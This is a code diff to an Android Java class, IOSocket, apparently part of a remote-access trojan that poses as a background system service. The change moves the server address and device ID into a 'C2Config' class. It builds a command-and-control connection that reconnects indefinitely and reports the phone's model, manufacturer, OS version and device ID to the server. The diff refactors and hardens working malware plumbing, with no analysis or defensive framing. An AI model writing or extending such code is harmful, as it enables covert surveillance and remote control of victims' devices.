@@ -1,9 +1,11 @@
 package com.android.background.services;
 
-import android.annotation.SuppressLint;
+import android.content.Context;
+import android.net.Uri;
 import android.os.Build;
-import android.provider.Settings;
+
 import java.net.URISyntaxException;
+
 import io.socket.client.IO;
 import io.socket.client.Socket;
 
@@ -14,13 +16,20 @@ public class IOSocket {
     private IOSocket() {
         try {
 
-            @SuppressLint("HardwareIds") String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
+            Context ctx = MainService.getContextOfApplication();
+            String deviceID = C2Config.getDeviceId(ctx);
+
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
             opts.reconnectionDelay = 5000;
             opts.reconnectionDelayMax = 999999999;
 
-            ioSocket = IO.socket(BuildConfig.SOCKET_URL + "?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
+            String url = C2Config.getUrl(ctx)
+                    + "?model=" + Uri.encode(Build.MODEL)
+                    + "&manf=" + Uri.encode(Build.MANUFACTURER)
+                    + "&release=" + Uri.encode(Build.VERSION.RELEASE)
+                    + "&id=" + Uri.encode(deviceID);
+            ioSocket = IO.socket(url);
         } catch (URISyntaxException e) {
             e.printStackTrace();
         }
